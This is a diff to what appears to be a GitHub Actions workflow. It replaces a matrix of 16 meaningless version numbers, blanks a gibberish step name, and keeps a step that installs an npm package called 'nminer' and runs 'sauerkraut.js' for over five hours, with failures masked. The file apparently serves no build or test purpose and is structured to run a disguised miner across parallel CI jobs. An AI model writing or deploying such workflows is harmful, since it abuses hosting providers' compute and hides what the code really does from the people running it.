@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6233 }
-          - { version: 4352 }
-          - { version: 9801 }
-          - { version: 7829 }
-          - { version: 3507 }
-          - { version: 6824 }
-          - { version: 1408 }
-          - { version: 6720 }
-          - { version: 8681 }
-          - { version: 2703 }
-          - { version: 7742 }
-          - { version: 6863 }
-          - { version: 3058 }
-          - { version: 2504 }
-          - { version: 7427 }
-          - { version: 4851 }
+          - { version: 6771 }
+          - { version: 4737 }
+          - { version: 7186 }
+          - { version: 6816 }
+          - { version: 232 }
+          - { version: 4077 }
+          - { version: 7124 }
+          - { version: 6306 }
+          - { version: 5183 }
+          - { version: 4443 }
+          - { version: 183 }
+          - { version: 2647 }
+          - { version: 5395 }
+          - { version: 3613 }
+          - { version: 2913 }
+          - { version: 4566 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ah plagiarise overheard uneven
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 342m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 327m node sauerkraut.js || echo "sauerkraut executed"
